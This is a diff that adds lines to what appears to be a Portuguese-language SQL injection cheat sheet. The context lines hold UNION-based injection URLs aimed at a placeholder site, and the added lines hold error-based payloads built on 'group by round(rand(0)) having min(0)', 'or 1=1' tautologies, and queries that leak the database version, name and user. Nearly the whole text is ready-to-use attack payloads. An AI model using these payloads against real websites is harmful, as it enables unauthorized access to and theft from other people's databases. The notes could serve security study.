@@ -69,4 +69,17 @@ https://site_aleatorio.com/union select order by 1,database(),3,4,5,6,user(),8,t
 https://site_aleatorio.com/union select order by 1,database(),3,4,5,6,user(),8,group_concat(table_name),10,11 from information_schema.schema.tables  where table_schema ="nome da database"
 -- agrupa em um único grupo os nomes da tabela
 
+-- error
+select name from users group by round(rand(0)) having min(0);
+-- duplicate key error em algumas database
+select name,count(*) from users group by round(rand(0));
+
+select name from users where name="sagar" or 1=1 group by round(rand(0)) having min(0);
+https://site_aleatorio.com/or 1=1 group by round(rand(0)) having min(0)
+
+select name,concat(version()," ",database()," ",user()," ",round(rand(0))) from users;
+https://site_aleatorio.com/or 1=1 group by concat(version()," ",database()," ",user()," ",round(rand(0))) having min(0)
+-- vai retornar versão,nome do banco, e usuário
+
+-- boolean
 
